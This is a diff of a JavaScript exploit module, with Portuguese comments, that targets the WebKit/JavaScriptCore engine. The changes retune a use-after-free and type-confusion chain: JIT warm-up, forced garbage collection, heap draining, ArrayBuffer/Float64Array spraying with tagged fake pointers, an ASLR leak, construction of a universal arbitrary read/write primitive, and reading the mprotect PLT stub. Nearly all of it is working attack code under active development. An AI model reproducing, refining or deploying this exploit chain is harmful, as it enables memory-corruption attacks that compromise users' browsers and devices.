@@ -1,8 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v157 - Re-foco UAF/Type Confusion e Contadores de Teste)
+// js/script3/testArrayBufferVictimCrash.mjs (v157 - Foco Reforçado na Type Confusion UAF)
 // =======================================================================================
 // ESTA VERSÃO FOCA EM ESTABILIZAR E APRIMORAR A CONDIÇÃO DE USE-AFTER-FREE E TYPE CONFUSION.
 // A reocupação exata da memória da vítima é a prioridade para o vazamento ASLR.
-// Adiciona contadores para facilitar o rastreamento dos testes.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -22,7 +21,8 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v157_UAF_REOCCUPATION_FOCUS";
+// ATENÇÃO: Esta constante será atualizada a cada nova versão de teste
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v157_TYPE_CONFUSION_REFINED";
 
 // Pausas ajustadas para estabilidade em ambientes com recursos limitados
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -32,9 +32,6 @@ const LOCAL_LONG_PAUSE = 1000;
 
 let global_spray_objects = [];
 let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
-
-// Variável para contar as tentativas de teste
-let testAttemptCount = 0;
 
 // Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
 let _fake_data_view = null;
@@ -229,14 +226,14 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
 async function triggerGC(logFn, pauseFn) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
     try {
-        for (let i = 0; i < 300; i++) { // Reduzido para 300 iterações (76.8MB)
+        for (let i = 0; i < 300; i++) { // Mantido 300 iterações (76.8MB)
             new ArrayBuffer(1024 * 256);
         }
     } catch (e) {
         logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
     }
     await pauseFn(LOCAL_SHORT_PAUSE);
-    for (let i = 0; i < 30; i++) { // Reduzido para 30
+    for (let i = 0; i < 30; i++) { // Mantido 30
         new ArrayBuffer(1024 * 4);
     }
     await pauseFn(LOCAL_SHORT_PAUSE);
@@ -245,21 +242,20 @@ async function triggerGC(logFn, pauseFn) {
 // Cria um objeto, o coloca em uma estrutura que causa otimizações,
 // e retorna uma referência a ele após a estrutura ser destruída.
 async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, VICTIM_SIZE_BYTES) {
-    const FNAME = "sprayAndCreateDanglingPointer";
     let dangling_ref = null;
     const VICTIM_SIZE_DOUBLES = VICTIM_SIZE_BYTES / 8;
 
     if (VICTIM_SIZE_BYTES % 8 !== 0) {
-        logFn(`[${FNAME}] ERRO: VICTIM_SIZE_BYTES (${VICTIM_SIZE_BYTES}) deve ser múltiplo de 8 para Float64Array.`, "critical", FNAME);
+        logFn(`[UAF] ERRO: VICTIM_SIZE_BYTES (${VICTIM_SIZE_BYTES}) deve ser múltiplo de 8 para Float64Array.`, "critical");
         throw new Error("VICTIM_SIZE_BYTES must be a multiple of 8.");
     }
 
     // PASSO 1: Criar o objeto vítima (Float64Array)
     let victim_object_arr = new Float64Array(VICTIM_SIZE_DOUBLES);
-    // Marcar com um valor inicial único para identificar se não foi sobrescrito
-    const original_magic_value_low = 0xDEADBEEF; 
-    const original_magic_value_high = 0xCAFELOW; // Para ser diferente das tags comuns
-    victim_object_arr[0] = _int64ToDouble_direct(new AdvancedInt64(original_magic_value_low, original_magic_value_high));
+    const original_magic_value_low = 0xDEADBEEF;
+    const original_magic_value_high = 0xCAFEBABE;
+    // Marcar com um valor inicial único e reconhecível
+    victim_object_arr[0] = _int64ToDouble_direct(new AdvancedInt64(original_magic_value_low, original_magic_value_high)); 
     for (let i = 1; i < VICTIM_SIZE_DOUBLES; i++) {
         victim_object_arr[i] = i + 0.123;
     }
@@ -268,73 +264,78 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
     dangling_ref = victim_object_arr;
 
     // Forçar otimizações (aumentado para máxima estabilidade da Type Confusion)
-    for (let i = 0; i < 5000; i++) { // Mais acessos para forçar JIT
-        victim_object_arr[0] += 0.000000000000001;
+    // Acessar muitas vezes para garantir que o JIT otimize o acesso a este array.
+    for (let i = 0; i < 10000; i++) { // Aumentado para 10000 acessos
+        victim_object_arr[0] += 0.000000000000001; 
     }
     
-    logFn(`[${FNAME}] Objeto vítima (Float64Array de ${VICTIM_SIZE_BYTES} bytes) criado e referência pendurada simulada.`, "info", FNAME);
-    logFn(`[${FNAME}] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info", FNAME);
-    logFn(`[${FNAME}] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info", FNAME);
+    logFn(`[UAF] Objeto vítima (Float64Array de ${VICTIM_SIZE_BYTES} bytes) criado e referência pendurada simulada.`, "info");
+    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info");
+    logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info");
 
     // PASSO 2: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
-    logFn("--- FASE 3: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest", FNAME);
+    logFn("--- FASE 3: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
     const ref_index = hold_objects.indexOf(victim_object_arr);
     if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
     victim_object_arr = null;
     await triggerGC(logFn, pauseFn); 
-    logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info", FNAME);
+    logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");
 
     // PASSO 3.1: "Hole Spraying" / Draining the Heap (focado no mesmo tipo)
-    logFn("--- FASE 3.1: Drenando o Heap com alocações temporárias do mesmo tamanho da vítima (Float64Array) ---", "subtest", FNAME);
+    logFn("--- FASE 3.1: Drenando o Heap com alocações temporárias do mesmo tamanho da vítima (Float64Array) ---", "subtest");
     const hole_spray_arrays = [];
-    const HOLE_SPRAY_COUNT = 2000; // Aumentado para 2000
+    const HOLE_SPRAY_COUNT = 3000; // Aumentado para 3000
     for (let i = 0; i < HOLE_SPRAY_COUNT; i++) {
         hole_spray_arrays.push(new Float64Array(VICTIM_SIZE_DOUBLES)); // Usar Float64Array
     }
-    hole_spray_arrays.length = 0; // Liberar imediatamente para criar buracos
+    // Liberar imediatamente para criar buracos
+    hole_spray_arrays.length = 0;
     await pauseFn(LOCAL_SHORT_PAUSE);
     await triggerGC(logFn, pauseFn); // GC adicional para liberar os buracos
     await pauseFn(LOCAL_SHORT_PAUSE);
 
     // PASSO 3.2: Pulverizar sobre a memória liberada com ArrayBuffer contendo o ponteiro desejado.
-    logFn("--- FASE 4: Pulverizando APENAS ArrayBuffer sobre a memória liberada ---", "subtest", FNAME);
+    logFn("--- FASE 4: Pulverizando APENAS ArrayBuffer/Float64Array sobre a memória liberada (AGRESSIVO) ---", "subtest");
     const spray_arrays = [];
-    const SPRAY_COUNT_UAF_NEW = 10000; // Aumentado para 10.000
+    const SPRAY_COUNT_UAF_NEW = 15000; // Aumentado para 15.000
     const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES;
 
     // Determinar o ponteiro a ser pulverizado (com tag JSValue)
-    const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Base estimada
+    // Usaremos uma base genérica para o spray, o ASLR real será calculado se o vazamento for bem-sucedido.
+    // Esta base é apenas para criar um double que *pareça* um ponteiro válido com a tag.
+    const TEMPORARY_ESTIMATED_WEBKIT_BASE_FOR_SPRAY = new AdvancedInt64(0x00000000, 0x01000000); 
     const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
     
-    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
+    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE_FOR_SPRAY.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
     
-    // Usar tags comuns de ponteiro de objeto para doubles.
+    // Tags comuns para ponteiros de objeto em doubles no WebKit
     const OBJECT_PTR_TAG_HIGH_0x402A = 0x402a0000;
-    const OBJECT_PTR_TAG_HIGH_0x412A = 0x412a0000; // Outra tag possível
+    const OBJECT_PTR_TAG_HIGH_0x412A = 0x412a0000;
 
-    // Prepara um valor de spray que seja um ponteiro para o vtable, com uma das tags
-    const spray_value_double_to_leak_ptr_402A = _int64ToDouble_direct(new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_0x402A));
-    const spray_value_double_to_leak_ptr_412A = _int64ToDouble_direct(new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_0x412A));
+    // Prepare o double de spray com a tag 0x402a
+    const spray_value_double_with_tag_402A = _int64ToDouble_direct(new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_0x402A));
+    // Prepare o double de spray com a tag 0x412a
+    const spray_value_double_with_tag_412A = _int64ToDouble_direct(new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_0x412A));
 
-    logFn(`[${FNAME}] Valores Double do VTable da Structure para pulverização:`, "info", FNAME);
-    logFn(`    Tag 0x402a: ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr_402A), 64)}`, "info", FNAME);
-    logFn(`    Tag 0x412a: ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr_412A), 64)}`, "info", FNAME);
+    logFn(`[UAF] Valores Double do VTable da Structure para pulverização:`, "info");
+    logFn(`    Tag 0x402a: ${toHex(_doubleToInt64_direct(spray_value_double_with_tag_402A), 64)}`, "info");
+    logFn(`    Tag 0x412a: ${toHex(_doubleToInt64_direct(spray_value_double_with_tag_412A), 64)}`, "info");
     
-    // Adicionar um valor mágico para indicar que a reocupação ocorreu
+    // Adicionar um valor mágico para indicar que a reocupação ocorreu, mesmo que não seja o ponteiro
     const MAGIC_REOCCUPY_VALUE_AI64 = new AdvancedInt64(0xDEADC0DE, 0xBAADF00D);
     const MAGIC_REOCCUPY_DOUBLE = _int64ToDouble_direct(MAGIC_REOCCUPY_VALUE_AI64);
 
     for (let i = 0; i < SPRAY_COUNT_UAF_NEW; i++) {
         const buf = new ArrayBuffer(SPRAY_BUF_SIZE_BYTES);
-        const view = new Float64Array(buf); // Usar Float64Array no spray para consistência
+        const view = new Float64Array(buf); // Usar Float64Array no spray para consistência com a vítima
 
-        // Alternar entre o ponteiro real e o valor mágico
-        if (i % 3 === 0) { // Um terço dos sprays terá o ponteiro 402a
-            view[0] = spray_value_double_to_leak_ptr_402A;
-        } else if (i % 3 === 1) { // Um terço dos sprays terá o ponteiro 412a
-            view[0] = spray_value_double_to_leak_ptr_412A;
-        } else { // O último terço terá o valor mágico
-            view[0] = MAGIC_REOCCUPY_DOUBLE;
+        // Alternar entre as tags e o valor mágico
+        if (i % 3 === 0) {
+            view[0] = spray_value_double_with_tag_402A; 
+        } else if (i % 3 === 1) {
+            view[0] = spray_value_double_with_tag_412A; 
+        } else {
+            view[0] = MAGIC_REOCCUPY_DOUBLE; // Injetar marcador
         }
         
         // Preencher o restante do ArrayBuffer com um padrão identificável
@@ -344,7 +345,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
         spray_arrays.push(buf);
     }
     hold_objects.push(spray_arrays);
-    logFn("    Pulverização de ArrayBuffer/Float64Array concluída sobre a memória da vítima.", "info", FNAME);
+    logFn("    Pulverização de ArrayBuffer/Float64Array concluída sobre a memória da vítima.", "info");
     
     return dangling_ref;
 }
@@ -352,11 +353,9 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v157_UAF_REOCCUPATION_FOCUS";
+    // Versão do teste no log
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
-
-    // Reiniciar o contador de testes para cada execução completa da função
-    testAttemptCount = 0; 
 
     let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
     const startTime = performance.now();
@@ -364,20 +363,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let found_m_mode = null;
 
     // Tamanhos de vítima para testar (focando nos mais comuns em bins pequenos/médios do bmalloc)
-    const VICTIM_SIZES_TO_TRY = [
-        0x80, // 128 bytes
-        0x100, // 256 bytes
-        0x180, // 384 bytes
-        0x200, // 512 bytes
-        0x280, // 640 bytes
-        0x300, // 768 bytes
-        0x380, // 896 bytes
-        0x400  // 1024 bytes
-    ];
+    const VICTIM_SIZES_TO_TRY = [0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x380, 0x400]; // De 128 a 1024 bytes
 
     for (const current_victim_size of VICTIM_SIZES_TO_TRY) {
-        testAttemptCount++; // Incrementa o contador de tentativas
-        logFn(`--- Teste #${testAttemptCount}: Tentando com VICTIM_SIZE_BYTES = ${toHex(current_victim_size)} ---`, "test", FNAME_CURRENT_TEST_BASE);
+        logFn(`--- Tentando com VICTIM_SIZE_BYTES = ${toHex(current_victim_size)} ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        // Limpar sprays e holds entre as tentativas de tamanhos
         global_spray_objects = [];
         hold_objects = [];
 
@@ -397,7 +387,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
             logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos OTIMIZADO) ---", "subtest");
             const sprayStartTime = performance.now();
-            const SPRAY_COUNT_INITIAL = 150000;
+            const SPRAY_COUNT_INITIAL = 150000; // Reduzido
             logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT_INITIAL}) para estabilização inicial do heap e anti-GC...`, "info");
             for (let i = 0; i < SPRAY_COUNT_INITIAL; i++) {
                 const dataSize = 20 + (i % 30);
@@ -439,11 +429,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                      throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
                 }
 
-                let attempts = 25; // Mais tentativas de leitura para capturar o vazamento
-                const ORIGINAL_VICTIM_VALUE_AI64 = _doubleToInt64_direct(dangling_ref_from_uaf[0]);
+                let attempts = 20; // Aumentado para 20 tentativas de leitura
+                const original_magic_value_int64 = _doubleToInt64_direct(dangling_ref_from_uaf[0]);
                 const MAGIC_REOCCUPY_VALUE_AI64 = new AdvancedInt64(0xDEADC0DE, 0xBAADF00D); // Do spray
                 
-                let reoccupation_status = "Nao Reocupado"; // "Nao Reocupado", "Reocupado por Magic", "Reocupado por Ponteiro"
+                let found_reoccupation_marker = false;
+                let found_valid_pointer_leak = false;
 
                 for(let i = 0; i < attempts; i++) {
                     leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0];
@@ -453,47 +444,48 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
                     const high_part_tag = (current_leaked_int64.high() >>> 16);
                     
-                    if (current_leaked_int64.equals(ORIGINAL_VICTIM_VALUE_AI64)) {
-                        logFn(`[UAF LEAK] Ainda valor ORIGINAL da vítima. Tentando novamente...`, "debug");
-                    } else if (current_leaked_int64.equals(MAGIC_REOCCUPY_VALUE_AI64)) {
-                        logFn(`[UAF LEAK] !!! MARCADO DE REOCUPAÇÃO ENCONTRADO !!! A memória foi reocupada!`, "warn");
-                        reoccupation_status = "Reocupado por Magic";
-                        // Continua, pois sabemos que a reocupação funciona, mas o ponteiro não está no slot 0
-                    } else if (!current_leaked_int64.equals(AdvancedInt64.Zero) &&
-                               !current_leaked_int64.equals(AdvancedInt64.NaNValue) &&
-                               (high_part_tag === 0x402a || high_part_tag === 0x412a) // Verifica por tags comuns de ponteiros
+                    // Prioriza a detecção do ponteiro real
+                    if (!current_leaked_int64.equals(original_magic_value_int64) && // Não é o valor original da vítima
+                        !current_leaked_int64.equals(AdvancedInt64.Zero) &&
+                        !current_leaked_int64.equals(AdvancedInt64.NaNValue) &&
+                        (high_part_tag === 0x402a || high_part_tag === 0x412a) // Tem uma das tags de ponteiro
                     ) {
                          logFn(`[UAF LEAK] VALOR DE PONTEIRO VAZADO ENCONTRADO NA TENTATIVA ${i+1}!`, "good");
-                         reoccupation_status = "Reocupado por Ponteiro";
-                         break; // Sai do loop, pois o vazamento principal foi encontrado
-                    } else {
-                        logFn(`[UAF LEAK] Valor lido inesperado: ${current_leaked_int64.toString(true)} (Provavelmente não é o original nem um ponteiro/magic)`, "debug");
+                         found_valid_pointer_leak = true;
+                         break;
+                    }
+
+                    // Se não for um ponteiro, verifica se é o marcador de reocupação
+                    if (current_leaked_int64.equals(MAGIC_REOCCUPY_VALUE_AI64)) {
+                        logFn(`[UAF LEAK] MARCADO DE REOCUPAÇÃO ENCONTRADO NA TENTATIVA ${i+1}!`, "warn");
+                        found_reoccupation_marker = true;
                     }
 
                     await pauseFn(LOCAL_VERY_SHORT_PAUSE);
-                } // Fim do loop de tentativas de leitura
+                }
 
-                // Verifica o status final da reocupação/vazamento
-                if (reoccupation_status === "Reocupado por Ponteiro") {
-                    logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR VAZADO! ++++++++++++", "vuln");
-                    uaf_leak_successful_for_size = true;
-                } else if (reoccupation_status === "Reocupado por Magic") {
-                    throw new Error(`Ponteiro vazado do UAF é inválido (double). Valor final lido: ${leaked_jsvalue_from_uaf_double}. Reocupação confirmada pelo MAGIC VALUE, mas ponteiro não foi encontrado no slot 0. O offset do ponteiro na vítima pode ser diferente.`);
-                } else {
-                    throw new Error(`Ponteiro vazado do UAF é inválido (double). Valor final lido: ${leaked_jsvalue_from_uaf_double}. Falha na reocupação do heap para tamanho ${toHex(current_victim_size)}.`);
+                if (!found_valid_pointer_leak) {
+                    let errorMessage = `Ponteiro vazado do UAF é inválido (double). Valor final lido: ${leaked_jsvalue_from_uaf_double}.`;
+                    if (found_reoccupation_marker) {
+                        errorMessage += " O marcador de reocupação foi encontrado, mas não um ponteiro válido. O spray pode estar corrompido ou o offset é outro. [Confusão de Tipo Ocorreu]";
+                    } else {
+                        errorMessage += " Falha na reocupação do heap ou valor de spray incorreto. [Confusão de Tipo NÃO Ocorreu Como Esperado]";
+                    }
+                    throw new Error(errorMessage);
                 }
                 
-                // Se a reocupação por ponteiro foi bem-sucedida, prossegue
-                let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
-                const original_high = untagged_uaf_addr.high();
-                const untagged_high = original_high & 0x0000FFFF;
+                logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR VAZADO! ++++++++++++", "vuln");
 
-                const high_part_tag_original = (original_high >>> 16);
-                if (high_part_tag_original === 0x402a || high_part_tag_original === 0x412a) {
+                let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
+                const original_high_leak = untagged_uaf_addr.high(); // Renomeado para evitar conflito com 'original_high' da vítima
+                const untagged_high = original_high_leak & 0x0000FFFF;
+
+                const high_part_tag_original_leak = (original_high_leak >>> 16);
+                if (high_part_tag_original_leak === 0x402a || high_part_tag_original_leak === 0x412a) {
                     untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
                     logFn(`[UAF LEAK] Ponteiro vazado após untagging (presumindo tag 0x402a/0x412a): ${untagged_uaf_addr.toString(true)}`, "leak");
                 } else {
-                    logFn(`[UAF LEAK] Ponteiro vazado: ${untagged_uaf_addr.toString(true)}. HIGH inesperado (0x${original_high.toString(16)}). NENHUM untagging aplicado.`, "warn");
+                    logFn(`[UAF LEAK] Ponteiro vazado: ${untagged_uaf_addr.toString(true)}. HIGH inesperado (0x${original_high_leak.toString(16)}). NENHUM untagging aplicado.`, "warn");
                 }
                 
                 const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
@@ -570,7 +562,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                     const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);
 
                     logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
-                    const mprotect_first_bytes = await arb_read(mprotect_addr_real, 4, logFn);
+                    const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
                     logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
                     if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
                         logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
@@ -647,18 +639,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                             victimSizeUsed: toHex(current_victim_size)
                         }
                     };
-                    return final_result; // Retorna e sai da função se um tamanho for bem-sucedido
+                    return final_result;
                 }
             }
 
         } catch (e_outer) {
-            logFn(`ERRO no loop principal para tamanho ${toHex(current_victim_size)} (Tentativa #${testAttemptCount}): ${e_outer.message}\n${e_outer.stack || ''}`, "error");
+            logFn(`ERRO no loop principal para tamanho ${toHex(current_victim_size)}: ${e_outer.message}\n${e_outer.stack || ''}`, "error");
         } finally {
-            logFn(`Iniciando limpeza intermediária para tamanho ${toHex(current_victim_size)} (Tentativa #${testAttemptCount})...`, "info");
+            logFn(`Iniciando limpeza intermediária para tamanho ${toHex(current_victim_size)}...`, "info");
             global_spray_objects = [];
             hold_objects = [];
             clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-            logFn(`Limpeza intermediária concluída para tamanho ${toHex(current_victim_size)} (Tentativa #${testAttemptCount}).`, "info");
+            logFn(`Limpeza intermediária concluída para tamanho ${toHex(current_victim_size)}.`, "info");
             await pauseFn(LOCAL_LONG_PAUSE);
         }
     }
